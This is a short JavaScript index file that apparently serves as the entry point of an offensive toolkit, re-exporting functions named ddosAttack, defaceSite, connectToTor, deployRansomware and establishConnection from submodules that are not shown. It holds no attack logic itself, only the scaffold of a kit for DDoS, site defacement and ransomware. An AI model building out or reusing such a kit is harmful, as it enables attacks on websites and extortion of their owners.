const ddos = require('./ddos/ddos');
const deface = require('./deface/deface');
const tor = require('./tor/tor');
const ransomware = require('./ransomware/ransomware');
const connection = require('./connection/connection');

module.exports = {
    ddosAttack: ddos.ddosAttack,
    defaceSite: deface.defaceSite,
    connectToTor: tor.connectToTor,
    deployRansomware: ransomware.deployRansomware,
    establishConnection: connection.establishConnection
};